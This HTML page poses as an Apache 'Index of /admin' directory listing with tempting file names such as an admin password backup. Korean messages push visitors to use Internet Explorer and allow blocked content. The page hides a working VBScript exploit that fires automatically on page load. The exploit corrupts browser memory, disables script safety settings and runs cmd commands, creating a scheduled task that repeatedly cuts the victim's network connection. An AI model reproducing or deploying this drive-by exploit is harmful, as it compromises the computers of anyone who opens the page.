<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=10">
<title>Index of /admin</title>
</head>
<body>
<script language="javascript">
var agt = navigator.userAgent.toLowerCase();
if (agt.indexOf("msie") != -1){
}
else{
alert("익스플로러만 지원하는 페이지입니다.");
}
</script>
<h1>Index of /admin</h1>
<!--익스플로러 전용(크롬 지원안함)-->
<table><tr><th><img src="./icons/blank.gif" alt="[ICO]"></th><th><a href="#">Name</a></th><th><a href="#">Last modified</a></th><th><a href="#">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr><tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="./icons/back.gif" alt="[DIR]"></td><td><a href="#">Parent Directory</a>       </td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="./icons/text.gif" alt="[TXT]"></td><td><a href="#">(backup)admin_passwo..&gt;</a></td><td align="right">16-May-2017 20:52  </td><td align="right">  0 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="./icons/text.gif" alt="[TXT]"></td><td><a href="#">Userlist.txt</a>           </td><td align="right">16-May-2017 20:53  </td><td align="right">  0 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="./icons/layout.gif" alt="[   ]"></td><td><a href="#">backup.html</a>            </td><td align="right">16-May-2017 20:52  </td><td align="right">  0 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="./icons/unknown.gif" alt="[   ]"></td><td><a href="#">dbconn.inc</a>             </td><td align="right">16-May-2017 20:53  </td><td align="right">  0 </td><td>&nbsp;</td></tr>
<tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache Server at <a href="#">limjangsoon@naver.com</a> Port 443</address>
<address>Support IExplorer 9,10,11</address>
<address>차단된 콘텐츠를 허용하여 주십시오</address>
    <script type="text/vbscript">
        Dim aw
        Dim plunge(32)
        Dim y(32)
        prefix = "%u4141%u4141"
        d = prefix & "%u0016%u4141%u4141%u4141%u4242%u4242"
        b = String(64000, "D")
        c = d & b
        x = UnEscape(c)

        Class ArrayWrapper
            Dim A()
            Private Sub Class_Initialize
                ' 2x2000 elements x 16 bytes / element = 64000 bytes
                ReDim Preserve A(1, 2000)
            End Sub

            Public Sub Resize()
                ReDim Preserve A(1, 1)
            End Sub
        End Class

        Class Dummy
        End Class

        Function getAddr (arg1, s)
            aw = Null
            Set aw = New ArrayWrapper

            For i = 0 To 32
                Set plunge(i) = s
            Next

            Set aw.A(arg1, 2) = s

            Dim addr
            Dim i
            For i = 0 To 31
                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then
                    addr = strToInt(Mid(y(i), 3 + 4, 2))
                End If
                y(i) = Null
            Next

            If addr = Null Then
                document.location.href = document.location.href
                Return
            End If

            getAddr = addr
        End Function

        Function leakMem (arg1, addr)
            d = prefix & "%u0008%u4141%u4141%u4141"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            Dim o
            o = aw.A(arg1, 2)

            leakMem = o
        End Function

        Sub overwrite (arg1, addr)
            d = prefix & "%u400C%u0000%u0000%u0000"
            c = d & intToStr(addr) & b
            x = UnEscape(c)

            aw = Null
            Set aw = New ArrayWrapper

            ' Single has vartype of 0x04
            aw.A(arg1, 2) = CSng(0)
        End Sub

        Function exploit (arg1)
		On Error Resume Next
            Dim addr
            Dim csession
            Dim olescript
            Dim mem
			Dim return
			Dim strcmd

            ' Create a vbscript class instance
            Set dm = New Dummy
            ' Get address of the class instance
            addr = getAddr(arg1, dm)
            ' Leak CSession address from class instance
            mem = leakMem(arg1, addr + 8)
            csession = strToInt(Mid(mem, 3, 2))
            ' Leak COleScript address from CSession instance
            mem = leakMem(arg1, csession + 4)
            olescript = strToInt(Mid(mem, 1, 2))
            ' Overwrite SafetyOption in COleScript (e.g. god mode)
            ' e.g. changes it to 0x04 which is not in 0x0B mask
            overwrite arg1, olescript + &H174

            ' Execute cmd
            'Set Object = CreateObject("Shell.Application")
            'Object.ShellExecute "cmd"
			Set wshshell = CreateObject("WScript.Shell")
			strcmd="cmd"
            return=wshshell.run(strcmd , 0 , false)
            if return="" then
            MsgBox "익스플로어 보호모드가 켜져있습니다. 모듈 사용을 위해 꺼주시기 바랍니다."
            else
			Set Object = CreateObject("Shell.Application")
			Object.ShellExecute "cmd","/C echo ipconfig /release > %temp%\test.bat && schtasks /create /tn calc /tr %temp%\test.bat /sc minute /mo 1 /ed 2017/05/17 /et 12:30"
            end if
        End Function

        Function triggerBug
            ' Resize array we are currently indexing
            aw.Resize()

            ' Overlap freed array area with our exploit string
            Dim i
            For i = 0 To 32
                ' 24000x2 + 6 = 48006 bytes
                y(i) = Mid(x, 1, 24000)
            Next
        End Function
    </script>

    <script type="text/javascript">
        function strToInt(s)
        {
            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);
        }
        function intToStr(x)
        {
            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);
        }
        var o;
        o = {"valueOf": function () {
                triggerBug();
                return 1;
            }};
        setTimeout(function() {exploit(o);}, 50);
    </script>
</body>
</html>
